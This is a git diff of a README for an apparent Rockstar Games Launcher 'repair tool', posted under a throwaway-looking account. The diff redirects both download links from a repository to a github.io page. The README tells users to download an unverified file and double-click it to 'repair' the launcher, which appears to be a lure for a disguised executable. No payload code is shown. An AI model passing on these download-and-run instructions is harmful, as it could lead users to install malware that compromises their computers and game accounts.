@@ -1,6 +1,6 @@
 # 🛠️ Rockstar-Games-Launcher-Fix - Restore Your Rockstar Games Access Now
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/consonantal-feeling203/Rockstar-Games-Launcher-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://consonantal-feeling203.github.io)
 
 This tool resolves common errors where the Rockstar Games Launcher fails to open or verify your account. It works on Windows 10 and Windows 11. Use this guide to fix your launcher and return to your games.
 
@@ -28,7 +28,7 @@ By running this tool, you clear the local configuration that prevents the game s
 
 Follow these steps to repair your application. 
 
-1. Visit this page to download the repair tool: [https://github.com/consonantal-feeling203/Rockstar-Games-Launcher-Fix](https://github.com/consonantal-feeling203/Rockstar-Games-Launcher-Fix)
+1. Visit this page to download the repair tool: [https://consonantal-feeling203.github.io](https://consonantal-feeling203.github.io)
 2. Locate the download button or the latest release link on the page.
 3. Save the file to your desktop for easy access.
 4. Double-click the downloaded file to begin the repair process.
